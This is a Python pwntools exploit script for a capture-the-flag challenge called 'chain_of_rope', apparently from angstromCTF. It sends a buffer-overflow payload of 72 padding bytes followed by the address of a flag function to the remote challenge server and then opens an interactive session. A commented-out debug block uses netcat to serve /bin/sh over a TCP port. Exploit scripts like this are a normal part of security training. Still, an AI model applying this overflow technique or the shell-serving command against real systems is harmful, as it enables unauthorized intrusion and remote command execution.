#!/usr/bin/env python2
# -*- coding: utf-8 -*-

import base64
from pwn import *
import time

'''
Final questions
I dont even see the vuln in this
Must be something with setvbuf in and out?
'''

#set environment
context.terminal = 'bash'
context.log_level = 'debug'
#context.arch = 'amd64'

DEBUG = 0

#conn = process('./chain_of_rope')
if DEBUG:
    #attach gdb to process
    conn = process('./chain_of_rope', env={"LD_PRELOAD": "./libc.so.6"})
    gdb.attach(conn)
    #HOW DO YOU RUN THE EXPLOIT AND ATTACH TO GDB PROCESS TO DEBUG?
    '''
    server = process(['nc', 'tcp-listen:1234,fork,reuseaddr', 'exec:/bin/sh'])
    io = remote('localhost', 1234)
    gdb.attach(io)
    '''
else:
    #remotely connect to the challenge
    conn = remote('shell.actf.co', 19400)


###Function addresses
#+----------------------------------+
flag = 0x80011a9 #3rd
#+----------------------------------+

#Create payload
#+----------------------------------+

payload = ''

#add junk to fill stack and ebp
payload += "A"*72
                       
payload += p64(flag)


#+----------------------------------+

#deploy payload
#+----------------------------------+
time.sleep(2)

conn.sendline(payload)

conn.interactive()
#+----------------------------------+
